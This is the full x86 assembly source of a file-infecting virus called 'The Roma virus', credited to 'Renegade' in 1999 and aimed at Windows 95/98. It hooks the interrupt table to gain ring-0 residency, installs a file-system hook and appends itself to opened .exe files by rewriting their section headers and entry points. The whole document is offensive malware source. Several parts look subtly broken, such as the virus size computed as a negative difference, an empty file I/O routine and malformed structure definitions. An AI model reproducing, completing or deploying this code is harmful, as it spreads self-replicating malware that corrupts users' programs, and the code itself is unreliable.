;The Roma virus
;Resident PE Infector
;Platform: Win95/Win98
;This virus is dedicated to Rome

.386p                                      ; cpu type
.model flat, STDCALL                       ; model type
                                    
extrn ExitProcess:proc                     ; API function

.data                                      ; beginning of data section
Ring0_FileIO equ 0032
IFSMgr equ 0040                         
heap equ 000d   
UniToBCSPath equ 0041
InstallFileSystemAPIhook equ 0067
aprilo equ 36  
IFSFN_RENAME equ 37  
convertis equ UniToBCSPath+256*256*IFSMgr  
api equ InstallFileSystemAPIhook+256*256*IFSMgr
io equ fileio+256*256*IFSMgr  
pheap equ heap+256*256*IFSMgr                                             
grandezza equ offset inizio-offset fine     

.code                                           ; beginning of code
                                             
inizio:                                         
pia_delta_offset:                               ; getting delta offset
push ebp                          
sub ebp,pia_delta_offset-inizio                
mov ebp,esp                       
mov eax,[ebp+4]                  
xchg eax,ebp                          
mov ebp,dword ptr [ebp+IDT]                     ; going resident through
mov esi,dword ptr [ebp+IDT+2]                   ; IDT
mov dword ptr [ebp+eccezione],esi               
mov bx,word ptr [esi+6]              
shl ebx,10                         
mov bx,word ptr [esi]                
mov dword ptr [ebp+vecio],ebx   
lea eax,[ebp+offset salva]           
mov word ptr [esi],ax                
shr eax,10                          
mov word ptr [esi+6],ax              
mov eax,0c000e990h                  
cmp dword ptr [eax],"ROMA"                     ; checking if already 
jne esci                                       ; resident                 
jmp continua                                   ; otherwise quit
continua:                           
mov esi,dword ptr [ebp+eccezione]     
mov ebx,dword ptr [ebp+vecio]   
mov word ptr [esi],bx                
shr ebx,10h                                    ; restoring handler
mov word ptr [esi+6],bx              
ridaje:                              
mov eax, dword ptr [ebp+vecio]                 ; giving back control
mov dword ptr fs:[00h],eax                     ; to host                   
esci:                                       
cmp ebp,0                            
je normalmente                                 ; then exit
mov eax,[ebp+pie]                 
add eax,[ebp+imagebase]               
jmp eax                                                          
salva:                                 
pushad                                         ; saving regs
mov eax,(fine-inizio)*2+100          
push eax                              
pia_heap:                                      ; getting heap
pop ecx                                  
or eax,eax                           
jz nabbas_tanza                       
xchg eax,edi                         
lea esi,dword ptr[ebp+inizio]                  ; beginning of virus
push edi                              
mov ecx,fine-inizio                    
rep movsb                             
pop edi                               
mov dword ptr [edi+num1-inizio],edi 
lea eax,[edi+aggancia-inizio]                  ; load lenght of API hook.
push eax                              
nhandler:                                      ; new handler       
pop ebx                                
mov [edi+secondo-inizio],eax         
jmp residente                   
nabbas_tanza:                                 
push 0
call ExitProcess                         
residente:                             
mov eax,0c000e990h                   
mov dword ptr [eax],"ROMA"                     ; writing ID when resident
mov byte ptr [edi+scudetto-inizio],0      
esci3:                               
popad                                          ; restore regs when
iretd                                          ; quitting
aggancia:                                      ; API hooking
push ebp                            
mov ebp,esp                         
sub esp,20                        
push ebx                             
push esi                             
push edi                             
db 0bfh                             
num1 dd 0                                 
sub edi,offset inizio                          ; alignment
cmp byte ptr [edi+scudetto],1           
je rifai                          
cmp dword ptr [ebp+12],aprilo
jne rifai                        
mov byte ptr [edi+scudetto], 1          
pusha                                          ; saving regs
lea esi,[edi+nome_tuo]              
mov eax,[ebp+16]                    
cmp al,0ffh                       
je converti                         
add al,40h                      
mov byte ptr [esi],al                          ; getting path
inc esi                              
mov byte ptr [esi], ':'              
inc esi                              
mov byte ptr [esi], '\'               
converti:                                     
push 0                                         ; converting
push 260                             
mov eax,[ebp+28]                     
mov eax, [eax+12]                    
add eax, 4                           
push eax                             
push esi                             
veracon:                                       
add esp,4*4                         
add esi,eax                          
mov byte ptr [esi],0                
cmp dword ptr [esi-4],offset tipo       
jne dispiace                         
lea esi,[edi+nome_tuo]                        ; load the filename
mov bx,2                            
mov cx,0                            
mov dx,1                            
call aprilo_sto_maledetto_fottuto_file_del_cazzo    ; open it
jc dispiace                           
mov dword ptr [edi+handle],eax         ; saving name of file
cmp dword ptr [edi],'ZM'               ; MZ ? no PE then => close file
jne chiudilo        
call vediamo_un_po                     ; reading file
mov dword ptr [edi+handle],eax       
cmp dword ptr [edi],00004550h          ; PE ?
jne chiudilo                           ; closing if not
xor eax,eax                        
mov ax,word ptr [esi.NumberOfSections]
mov ecx,IMAGE_SECTION_HEADER_SIZE      ; searching last secion
dec eax                             
mul ecx                             
mov esi,eax                       
add esi,dword ptr [edi+movilo]   
mov dword ptr [edi+sec_ptr],esi     
lea edx,[edi+IMAGE_SECTION_HEADER]           
mov ecx,IMAGE_SECTION_HEADER_SIZE   
xchg esi,edx                        
call vediamo_un_po                     ; reading it  
lea esi, [edi+IMAGE_OPTIONAL_HEADER]          
cmp dword ptr [esi.ce_semo_gia_stati],"ROMA"    ; is there ID already ?
je chiudilo                        
mov eax, dword ptr [esi.bene_ora_iniziamo_con_il_allineamento_delle_sezioni]    
mov [edi+famolo],eax                          
mov eax, dword ptr [esi.continu_iamo_poi_con_lallineamento_dei_files]       
mov [edi+famolo],eax                         
mov eax, dword ptr [esi.ecco_lindirizzo_del_punto_di_entrata] 
mov [edi+pie],eax                          
mov eax,dword ptr [esi.grandezza_dell_immagine]         
mov [edi+famolo], eax                   ; /\      
mov eax,dword ptr [esi.ImageBase]       ; || alignments + entryp.+img.base
mov [edi+imagebase],eax                        
lea esi,[edi+IMAGE_SECTION_HEADER]            ; last section
mov eax,dword ptr [esi.PointerToRawData]     ; pointing to Raw data
add eax,dword ptr [esi.VirtualSize]   
mov dword ptr [edi+mo_ce_famo_posto], eax      ; place it there
mov eax,dword ptr [esi.SizeOfRawData] 
add eax,grandezza                        
mov ecx,dword ptr [edi+famolo]     
push eax                            
push ecx                             
xor edx,edx                         
div ecx                              
pop ecx                              
sub ecx,edx                         
pop eax                              
add eax,ecx                         
mov dword ptr [esi.SizeOfRawData],eax 
mov eax,dword ptr [esi.VirtualSize] 
add eax,grandezza                            ; size of virus
mov dword ptr [esi.VirtualSize],eax 
or dword ptr [esi.ce_possiamo_scrivere],0e0000020h  ; can we write here ?
lea esi,[edi+IMAGE_OPTIONAL_HEADER]           ; pointing to header
mov eax,dword ptr [edi+famolo]          
add eax,grandezza                    
mov ecx,dword ptr [edi+famolo]         ; sect.align.
push eax                             
push ecx                             
xor edx,edx                         
div ecx                              
pop ecx                              
sub ecx,edx                         
pop eax                              
add eax,ecx                         
mov dword ptr [esi.grandezza_dell_immagine],eax 
lea esi,[edi+IMAGE_SECTION_HEADER]            
mov eax,dword ptr [esi.VirtualAddress]
add eax,dword ptr [esi.VirtualSize]
sub eax,grandezza                       ; getting EIP
mov ebx,[edi+imagebase]            
add ebx,eax                         
lea esi,[edi+IMAGE_OPTIONAL_HEADER]          
mov dword ptr [esi.ecco_lindirizzo_del_punto_di_entrata],eax 
mov dword ptr [esi.ce_semo_gia_stati],"ROMA"     ; our ID
lea esi,[edi+IMAGE_SECTION_HEADER]            
mov ecx,IMAGE_SECTION_HEADER_SIZE      ; pointing to section
mov edx,dword ptr [edi+sec_ptr]        ; + writing it
call scrivece                      
lea esi,[edi+IMAGE_FILE_HEADER]           
mov ecx,IMAGE_FILE_HEADER_SIZE+\       ; writing PE header
IMAGE_OPTIONAL_HEADER_SIZE  
mov edx,dword ptr [edi+testa]    
call scrivece                       
push edi                            
mov esi,fine-inizio                   
add esi,edi                           
xchg edi,esi                          ; copying virus to end
add edi,offset inizio                 ; and writing it
add esi,offset inizio                
mov ecx,fine-inizio                    
push edi                             
rep movsb                            
pop edi                              
mov esi,edi                         
mov edx,edi                         
add edx,offset inizio               
add edx,fine-inizio                  
mov ecx,grandezza                 
mov esi,dword ptr [edi+ce_possiamo_scrivere]  
xchg edx,esi                        
call scrivece                           ; writing...
chiudilo:                                   
call spegni_la_luce_e_chiudi_la_porta_quando_esci      ; exit                 
dispiace:                                      
popa                                ; restore registers
rifai:                                    
mov byte ptr [edi+scudetto],0          
push dword ptr [ebp+28]              ; resetting flags
push dword ptr [ebp+24]              
push dword ptr [ebp+20]              
push dword ptr [ebp+16]              
push dword ptr [ebp+12]              
push dword ptr [ebp+8]               
db 0b8h                              
secondo dd 0                                
call [eax]                           ; restoring old hook
add esp, 6*4                          
pop edi                               
pop esi                              
pop ebx                              
leave                               ; go out
ret                                 
iover:                                       
fileio:                               
ret                                  
normalmente: 
push 0                              ; exit  
call ExitProcess    
aprilo_sto_maledetto_fottuto_file_del_cazzo:     ; open file
mov eax,0d500h
call fileio 
ret
spegni_la_luce_e_chiudi_la_porta_quando_esci:
mov eax,0d700h                                   ;quit
call il_nome
ret
vediamo_un_po:        ; reading
mov eax,0d600h
call il_nome
ret  
scrivece:             ; writing
mov eax,0d601h
call il_nome
ret
il_nome:
mov ebx,dword ptr [edi+handle]
call fileio
ret
handle dd 0                        
movilo dd 0                         
sec_ptr dd 0                         
pie dd 0                        
famolo dd 0                        
testa dd 0                       
mo_ce_famo_posto dd 0                       
stringhe db "The Roma virus..."
         db "by Renegade...1999 all rights reserved  "
         db "Roma...a Capitale der monno"
         db "This virus is dedicated to Rome"
IDT dd 0                         
eccezione dd 0                         
vecio dd 0 
imagebase dd 0                        
nome_tuo db 260 dup (0)              
scudetto db 0                        
tipo db "*.exe",0                                 
IMAGE_FILE_HEADER STRUC          
NumberOfSections dw ?  
PointerToSymbolTable dd ?  
NumberOfSymbols dd ?  
SizeOfOptionalHeader dw ?  
IMAGE_FILE_HEADER ENDS            
IMAGE_FILE_HEADER_SIZE = SIZE IMAGE_FILE_HEADER
IMAGE_DATA_DIRECTORY STRUC
DD_VirtualAddress dd ?                          
DD_Size dd ?                          
IMAGE_DATA_DIRECTORY ENDS                        
IMAGE_DIRECTORY_ENTRIES STRUC                       
DE_BaseReloc IMAGE_DATA_DIRECTORY ?  
DE_BoundImport IMAGE_DATA_DIRECTORY ?  
DE_IAT IMAGE_DATA_DIRECTORY ? 
DE_LoadConfig IMAGE_DATA_DIRECTORY ?  
DE_TLS IMAGE_DATA_DIRECTORY ?  
IMAGE_DIRECTORY_ENTRIES ENDS                       
IMAGE_NUMBEROF_DIRECTORY_ENTRIES equ 5              
IMAGE_OPTIONAL_HEADER STRUC                        
OH_Magic dw ?           
OH_SizeOfInitializedData dd ?           
OH_SizeOfUninitializedData dd ?           
ecco_lindirizzo_del_punto_di_entrata dd byte ptr ?  
OH_BaseOfCode dd byte ptr ?   
OH_BaseOfData dd byte ptr ?   
ImageBase dd byte ptr ?   
bene_ora_iniziamo_con_il_allineamento_delle_sezioni dd ?           
continu_iamo_poi_con_lallineamento_dei_files dd ?           
ce_semo_gia_stati dd ?            
grandezza_dell_immagine dd ?           
ends  
IMAGE_OPTIONAL_HEADER_SIZE = SIZE IMAGE_OPTIONAL_HEADER
IMAGE_SECTION_HEADER STRUC                         
SH_Name db 8 dup(?)            
union                  
VirtualSize dd ?                    
ends                 
VirtualAddress dd byte ptr ?           
SizeOfRawData dd ?                    
PointerToRawData dd byte ptr ?         
PointerToRelocations dd byte ptr ?          
PointerToLinenumbers dd byte ptr ?          
NumberOfRelocations dw ?                    
SH_NumberOfLinenumbers  DW ?                   
ce_possiamo_scrivere     DD ?                   
IMAGE_SECTION_HEADER ENDS                          
IMAGE_SECTION_HEADER_SIZE = SIZE IMAGE_SECTION_HEADER
fine:                                     
end inizio                              
end                                      
